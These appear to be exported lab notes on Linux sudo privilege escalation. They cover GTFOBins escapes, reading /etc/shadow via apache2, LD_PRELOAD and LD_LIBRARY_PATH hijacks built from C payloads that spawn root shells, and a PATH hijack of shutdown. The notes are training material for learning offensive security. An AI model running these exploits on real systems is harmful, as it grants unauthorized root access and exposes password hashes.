<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Sudo</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Sudo</h1><br/><p><strong><h1>Sudo</h1></strong></p><p></p><p><strong><h2>A) Shell Escape Sequences</h2></strong></p><p></p><p>List the programs which sudo allows your user to run:</p><p></p><p><strong>sudo -l</strong></p><p></p><p>Visit GTFOBins (<strong>https://gtfobins.github.io</strong>) and search for some of the program names. If the program is listed with &quot;sudo&quot; as a function, you can use it to elevate privileges, usually via an escape sequence.</p><p></p><p>Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.</p><p></p><p>For an extra challenge, try to gain a root shell using all the programs on the list!</p><p></p><p><strong>Example</strong> (If Apache is given sudo access)</p><p><strong>sudo apache2 -f /etc/shadow</strong></p><p></p><p><strong>Note:</strong> This technique is used to read the first line of any file.</p><p></p><p></p><p><strong><h2>B) Environment Variables</h2></strong></p><p></p><p>Sudo can be configured to inherit certain environment variables from the user&#39;s environment.</p><p></p><p>Check which environment variables are inherited (look for the env_keep options):</p><p></p><p><strong>sudo -l</strong></p><p></p><p><strong>LD_PRELOAD</strong> and <strong>LD_LIBRARY_PATH</strong> are both inherited from the user&#39;s environment. <strong>LD_PRELOAD</strong> loads a shared object before any others when a program is run. <strong>LD_LIBRARY_PATH</strong> provides a list of directories where shared libraries are searched for first.</p><p></p><p><strong><span style="text-decoration:underline;">Using LD_PRELOAD</span></strong></p><p></p><p>Create a shared object using the code located at /home/user/tools/sudo/preload.c:</p><p></p><p><strong>preload.c</strong></p><p>#include &lt;stdio.h&gt;</p><p>#include &lt;sys/types.h&gt;</p><p>#include &lt;stdlib.h&gt;</p><p></p><p>void _init() {</p><p>        unsetenv(&quot;LD_PRELOAD&quot;);</p><p>        setresuid(0,0,0);</p><p>        system(&quot;/bin/bash -p&quot;);</p><p>}</p><p></p><p></p><p><strong>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</strong></p><p></p><p>Run one of the <strong>programs</strong> you are <strong>allowed</strong> to run via <strong>sudo</strong> (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:</p><p></p><p><strong>sudo LD_PRELOAD=/tmp/preload.so program-name-here</strong></p><p></p><p>A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.</p><p></p><p><strong>Example</strong></p><p><img src="images/221-1.png" alt="images/221-1.png" /></p><p></p><p><strong><span style="text-decoration:underline;">Using LD_LIBRARY_PATH</span></strong></p><p></p><p>Run <strong>ldd</strong> against the apache2 program file to see which <strong>shared libraries</strong> are used by the program:</p><p></p><p><strong>ldd /usr/sbin/apache2</strong></p><p></p><p>Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:</p><p></p><p><strong>library_path.c</strong></p><p>#include &lt;stdio.h&gt;</p><p>#include &lt;stdlib.h&gt;</p><p></p><p>static void hijack() __attribute__((constructor));</p><p></p><p>void hijack() {</p><p>        unsetenv(&quot;LD_LIBRARY_PATH&quot;);</p><p>        setresuid(0,0,0);</p><p>        system(&quot;/bin/bash -p&quot;);</p><p>}</p><p></p><p></p><p><strong>gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</strong></p><p></p><p>Run <strong>apache2</strong> using <strong>sudo</strong>, while settings the <strong>LD_LIBRARY_PATH</strong> environment variable to <strong>/tmp</strong> (where we output the compiled shared object):</p><p></p><p><strong>sudo LD_LIBRARY_PATH=/tmp apache2</strong></p><p></p><p>A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.</p><p></p><p><strong>Example</strong></p><p><img src="images/221-2.png" alt="images/221-2.png" /></p><p></p><p><strong>Note:</strong> If we want to consider any other library file and then we need to change the name accordingly in the <strong>library_path.c</strong> file. (Research)</p><p></p><p><strong><h2>C) Path Variable in Sudo</h2></strong></p><p></p><p>Lets check sudo on the Target Machine:</p><p><img src="images/221-3.png" alt="images/221-3.png" /></p><p></p><p>Normal Sudo</p><p><img src="images/221-4.png" alt="images/221-4.png" /></p><p></p><p>As we can see, the <strong>secure_path</strong> is not present on the target machine. This means if any executible uses any program without absolute path. We can use this to plant our program in a different path.</p><p></p><p>Lets examine the <strong>/usr/sbin/shutdown</strong> binary by taking it to kali machine.</p><p></p><p><span style="text-decoration:underline;">Target Machine</span>: <strong>cp /usr/sbin/shutdown /tmp</strong></p><p><span style="text-decoration:underline;">Attacker Machine</span>: <strong>scp -P 9090 fox@10.10.93.57:/tmp/shutdown .</strong></p><p></p><p><strong><span style="text-decoration:underline;">Examine the Shutdown Binary using radare2:</span></strong></p><p></p><p><strong>radare2 -AAA &lt;Filename&gt;</strong></p><p><strong>pdf @main</strong></p><p></p><p><img src="images/221-5.png" alt="images/221-5.png" /></p><p></p><p>As we can see, the <strong>poweroff</strong> is called <strong>without absoulute path</strong>.</p><p>We need to copy the <strong>/bin/bash</strong> binary to <strong>/tmp</strong> and rename as <strong>poweroff</strong> and <strong>add the /tmp path</strong> while calling the <strong>shutdown using sudo</strong>.</p><p></p><p><strong>cp /bin/bash /tmp/poweroff</strong></p><p></p><p>Then run the sudo command along with PATH as follows:</p><p></p><p><strong>sudo &quot;PATH=/tmp:$PATH&quot; /usr/sbin/shutdown</strong></p><p></p><p><img src="images/221-6.png" alt="images/221-6.png" /></p><p></p><p></p><p><strong><h2>END</h2></strong></p></div>
</body>
</html>
